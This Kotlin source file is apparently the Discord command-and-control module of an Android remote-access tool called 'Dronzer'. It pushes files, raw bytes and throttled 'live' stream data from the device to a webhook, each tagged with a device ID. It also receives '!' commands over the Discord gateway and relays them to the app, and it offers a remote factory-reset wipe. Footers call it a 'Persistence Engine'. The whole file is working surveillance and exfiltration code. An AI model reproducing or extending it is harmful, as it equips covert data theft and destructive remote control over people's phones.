package com.example.dronzer

import android.content.Context
import android.os.Build
import android.util.Log
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import okio.BufferedSink
import okio.source
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object DiscordManager {

    private var webhookUrl = ""
    private var botToken = ""
    private var channelId = ""
    
    private const val MAX_FILE_SIZE = 7 * 1024 * 1024 

    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .connectTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(0, TimeUnit.MILLISECONDS)
        .build()
    
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var webSocket: WebSocket? = null
    private var lastSequence: Int? = null
    private var heartbeatJob: Job? = null
    
    private var lastStreamSendTime = 0L
    private const val STREAM_THROTTLE_MS = 2000

    fun initialize(context: Context) {
        val prefs = context.getSharedPreferences("dronzer_config", Context.MODE_PRIVATE)
        webhookUrl = prefs.getString("webhook_url", "") ?: ""
        botToken = prefs.getString("bot_token", "") ?: ""
        channelId = prefs.getString("channel_id", "") ?: ""
        Log.d("DiscordManager", "Config initialized. BotToken set: ${botToken.isNotEmpty()}, Webhook set: ${webhookUrl.isNotEmpty()}")
    }

    private suspend fun executeWithRateLimit(request: Request): Response? {
        if (webhookUrl.isEmpty() && botToken.isEmpty()) {
            Log.e("DiscordManager", "Discord configuration is missing. Cannot execute request.")
            return null
        }
        return withContext(Dispatchers.IO) {
            try {
                var response = client.newCall(request).execute()
                if (response.code == 429) {
                    val retryAfter = response.header("x-ratelimit-reset-after")?.toDoubleOrNull() ?: 5.0
                    Log.w("DiscordManager", "Rate limited. Waiting for $retryAfter seconds.")
                    response.close()
                    delay((retryAfter * 1000).toLong() + 500)
                    response = client.newCall(request).execute()
                }
                response
            } catch (e: Exception) {
                Log.e("DiscordManager", "Request failed: ${e.message}")
                null
            }
        }
    }

    private fun getDeviceTag(): String {
        val timestamp = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        return " [ID:${DeviceManager.deviceId}] [$timestamp]"
    }

    fun sendToWebhook(content: String, fileName: String? = null, raw: Boolean = false) {
        if (webhookUrl.isEmpty()) return
        scope.launch {
            try {
                val request: Request
                val deviceTag = getDeviceTag()
                if (fileName != null) {
                    val payloadJson = JSONObject().put("content", "Output: `$fileName`$deviceTag").toString()
                    val requestBody = MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("payload_json", payloadJson)
                        .addFormDataPart("file", fileName, content.toRequestBody("text/plain; charset=utf-8".toMediaType()))
                        .build()
                    request = Request.Builder().url(webhookUrl).post(requestBody).build()
                } else {
                    val json = JSONObject()
                    val safeContent = if (content.length > 1900) content.take(1900) + "\n(truncated)" else content
                    val finalContent = if (raw) safeContent else "```\n$safeContent\n```$deviceTag"
                    json.put("content", finalContent)
                    val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
                    request = Request.Builder().url(webhookUrl).post(body).build()
                }
                executeWithRateLimit(request)?.close()
            } catch (e: Exception) {
                Log.e("DiscordManager", "Webhook error: ${e.message}")
            }
        }
    }

    fun sendStartNotification(deviceModel: String) {
        if (botToken.isEmpty() || channelId.isEmpty()) return
        scope.launch {
            try {
                val embed = JSONObject()
                    .put("title", "🛸 DRONZER SYSTEM ONLINE")
                    .put("description", "**Device Detected:** `$deviceModel` (ID: `${DeviceManager.deviceId}`)\n\nWould you like to initialize the **Remote Control GUI** on your host Windows PC?")
                    .put("color", 0x8B0000) 
                    .put("thumbnail", JSONObject().put("url", "https://i.imgur.com/8n9S9Yp.png")) 
                    .put("footer", JSONObject().put("text", "Dronzer Persistence Engine • Active"))
                    .put("timestamp", java.time.OffsetDateTime.now().toString())

                val actionRow = JSONObject()
                    .put("type", 1)
                    .put("components", JSONArray()
                        .put(JSONObject().put("type", 2).put("label", "YES, OPEN GUI").put("style", 3).put("custom_id", "open_gui_yes"))
                        .put(JSONObject().put("type", 2).put("label", "NO, DISMISS").put("style", 4).put("custom_id", "open_gui_no"))
                    )

                val payload = JSONObject()
                    .put("embeds", JSONArray().put(embed))
                    .put("components", JSONArray().put(actionRow))

                val body = payload.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
                val request = Request.Builder()
                    .url("https://discord.com/api/v10/channels/$channelId/messages")
                    .post(body)
                    .addHeader("Authorization", "Bot $botToken")
                    .build()
                
                executeWithRateLimit(request)?.close()
            } catch (e: Exception) {
                Log.e("DiscordManager", "Start Notification error: ${e.message}")
            }
        }
    }

    fun sendResetConfirmation(deviceModel: String) {
        if (botToken.isEmpty() || channelId.isEmpty()) return
        scope.launch {
            try {
                val embed = JSONObject()
                    .put("title", "⚠️ FACTORY RESET WARNING")
                    .put("description", "You are about to trigger a full **FACTORY RESET** on device: `$deviceModel` (ID: `${DeviceManager.deviceId}`).\n\n**THIS ACTION IS IRREVERSIBLE AND WILL WIPE ALL DATA.**\n\nAre you absolutely sure?")
                    .put("color", 0xFF0000)
                    .put("footer", JSONObject().put("text", "Dronzer Security Protocol"))
                    .put("timestamp", java.time.OffsetDateTime.now().toString())

                val actionRow = JSONObject()
                    .put("type", 1)
                    .put("components", JSONArray()
                        .put(JSONObject().put("type", 2).put("label", "CONFIRM WIPE").put("style", 4).put("custom_id", "reset_yes"))
                        .put(JSONObject().put("type", 2).put("label", "CANCEL").put("style", 2).put("custom_id", "reset_no"))
                    )

                val payload = JSONObject()
                    .put("embeds", JSONArray().put(embed))
                    .put("components", JSONArray().put(actionRow))

                val body = payload.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
                val request = Request.Builder()
                    .url("https://discord.com/api/v10/channels/$channelId/messages")
                    .post(body)
                    .addHeader("Authorization", "Bot $botToken")
                    .build()
                
                executeWithRateLimit(request)?.close()
            } catch (e: Exception) {
                Log.e("DiscordManager", "Reset Notification error: ${e.message}")
            }
        }
    }

    fun sendBytesToWebhook(bytes: ByteArray, fileName: String, isLive: Boolean = false) {
        if (webhookUrl.isEmpty()) return
        val currentTime = System.currentTimeMillis()
        if (isLive && (currentTime - lastStreamSendTime) < STREAM_THROTTLE_MS) return
        if (isLive) lastStreamSendTime = currentTime

        scope.launch {
            try {
                val deviceTag = getDeviceTag()
                val payloadJson = JSONObject().put("content", "File: `$fileName`$deviceTag").toString()
                
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("payload_json", payloadJson)
                    .addFormDataPart("file", fileName, bytes.toRequestBody("application/octet-stream".toMediaType()))
                    .build()

                val request = Request.Builder().url(webhookUrl).post(requestBody).build()
                executeWithRateLimit(request)?.close()
            } catch (e: Exception) {
                Log.e("DiscordManager", "Byte Webhook error: ${e.message}")
            }
        }
    }

    class ProgressRequestBody(
        private val file: File,
        private val contentType: MediaType?,
        private val onProgress: (Long, Long) -> Unit
    ) : RequestBody() {
        override fun contentType() = contentType
        override fun contentLength() = file.length()
        override fun writeTo(sink: BufferedSink) {
            val source = file.source()
            var totalBytesRead = 0L
            val buffer = okio.Buffer()
            var readCount: Long
            while (source.read(buffer, 8192).also { readCount = it } != -1L) {
                sink.write(buffer, readCount)
                totalBytesRead += readCount
                onProgress(totalBytesRead, contentLength())
            }
            source.close()
        }
    }

    fun sendFileToWebhook(
        file: File, 
        message: String = "", 
        onProgress: ((Long, Long) -> Unit)? = null,
        onResult: ((Boolean, String?) -> Unit)? = null
    ) {
        if (webhookUrl.isEmpty()) {
            onResult?.invoke(false, "Webhook URL not configured.")
            return
        }
        if (file.length() > MAX_FILE_SIZE) {
            onResult?.invoke(false, "File too large (${file.length() / 1024 / 1024}MB). limit is 7MB.")
            return
        }

        scope.launch {
            try {
                val deviceTag = getDeviceTag()
                val finalMessage = if (message.isNotEmpty()) "$message $deviceTag" else "File uploaded: `${file.name}`$deviceTag"
                val payloadJson = JSONObject().put("content", finalMessage).toString()
                val fileBody = ProgressRequestBody(file, "application/octet-stream".toMediaType()) { current, total ->
                    onProgress?.invoke(current, total)
                }

                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("payload_json", payloadJson)
                    .addFormDataPart("file", file.name, fileBody)
                    .build()

                val request = Request.Builder().url(webhookUrl).post(requestBody).build()
                val response = executeWithRateLimit(request)
                if (response != null && response.isSuccessful) {
                    onResult?.invoke(true, null)
                    response.close()
                } else if (response != null) {
                    val errorMsg = "HTTP ${response.code}: ${response.message}"
                    onResult?.invoke(false, errorMsg)
                    response.close()
                } else {
                    onResult?.invoke(false, "Request failed")
                }
            } catch (e: Exception) {
                onResult?.invoke(false, e.message)
            }
        }
    }

    fun startListening(context: android.content.Context, onCommand: (String) -> Unit) {
        initialize(context)
        if (botToken.isEmpty() || channelId.isEmpty()) {
            Log.w("DiscordManager", "Cannot start listening: Missing Bot Token or Channel ID.")
            return
        }
        stop()
        val request = Request.Builder().url("wss://gateway.discord.gg/?v=10&encoding=json").build()
        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) { Log.d("DiscordManager", "WS Opened") }
            override fun onMessage(webSocket: WebSocket, text: String) {
                try {
                    val json = JSONObject(text)
                    val op = json.getInt("op")
                    if (json.has("s") && !json.isNull("s")) lastSequence = json.getInt("s")
                    when (op) {
                        10 -> {
                            startHeartbeat(webSocket, json.getJSONObject("d").getLong("heartbeat_interval"))
                            identify(webSocket)
                        }
                        0 -> {
                            val t = json.getString("t")
                            val d = json.getJSONObject("d")
                            if (t == "MESSAGE_CREATE") {
                                if (d.getString("channel_id") == channelId && !d.getJSONObject("author").optBoolean("bot", false)) {
                                    val content = d.getString("content")
                                    if (content.startsWith("!")) onCommand(content.removePrefix("!").trim())
                                }
                            } else if (t == "INTERACTION_CREATE") {
                                val customId = d.getJSONObject("data").getString("custom_id")
                                val interactionId = d.getString("id")
                                val interactionToken = d.getString("token")

                                acknowledgeInteraction(interactionId, interactionToken)

                                when (customId) {
                                    "open_gui_yes" -> onCommand("yes")
                                    "open_gui_no" -> onCommand("no")
                                    "reset_yes" -> onCommand("confirm_reset")
                                    "reset_no" -> onCommand("cancel_reset")
                                }
                            }
                        }
                        1 -> sendHeartbeat(webSocket)
                    }
                } catch (e: Exception) {}
            }
            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                scope.launch { delay(10000); startListening(context, onCommand) }
            }
        })
    }

    private fun acknowledgeInteraction(id: String, token: String) {
        scope.launch {
            try {
                val payload = JSONObject().put("type", 6) 
                val body = payload.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
                val request = Request.Builder()
                    .url("https://discord.com/api/v10/interactions/$id/$token/callback")
                    .post(body)
                    .build()
                executeWithRateLimit(request)?.close()
            } catch (e: Exception) {}
        }
    }

    private fun identify(webSocket: WebSocket) {
        val json = JSONObject().put("op", 2).put("d", JSONObject()
            .put("token", botToken)
            .put("intents", 33281)
            .put("properties", JSONObject().put("\$os", "android").put("\$browser", "dronzer").put("\$device", "dronzer")))
        webSocket.send(json.toString())
    }

    private fun startHeartbeat(webSocket: WebSocket, interval: Long) {
        heartbeatJob?.cancel()
        heartbeatJob = scope.launch {
            delay((interval * 0.1).toLong())
            while (isActive) { sendHeartbeat(webSocket); delay(interval) }
        }
    }

    private fun sendHeartbeat(webSocket: WebSocket) {
        webSocket.send(JSONObject().put("op", 1).put("d", lastSequence ?: JSONObject.NULL).toString())
    }

    fun stop() { heartbeatJob?.cancel(); webSocket?.close(1000, "Stop"); webSocket = null }
}